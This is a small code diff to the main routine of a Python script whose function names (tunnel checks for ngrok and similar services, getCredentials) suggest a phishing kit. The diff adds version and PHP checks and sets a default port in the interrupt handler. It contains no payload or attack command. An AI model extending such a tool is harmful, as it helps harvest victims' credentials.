@@ -22,6 +22,8 @@ checkPermissions()
 installGetText()
 languageSelector()
 checkConnection()
+verCheck()
+checkPHP()
 checkLocalxpose()
 checkNgrok()
 checkOpenport()
@@ -30,7 +32,6 @@ checkbinaryLT()
 checkLT()
 ifSettingsNotExists()
 readConfig()
-
 
 if __name__ == "__main__":
     try:
@@ -52,5 +53,6 @@ if __name__ == "__main__":
         getCredentials(port)
 
     except KeyboardInterrupt:
-        emailPrompt3(port)
+        port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
+        endMessage(port)
         exit()
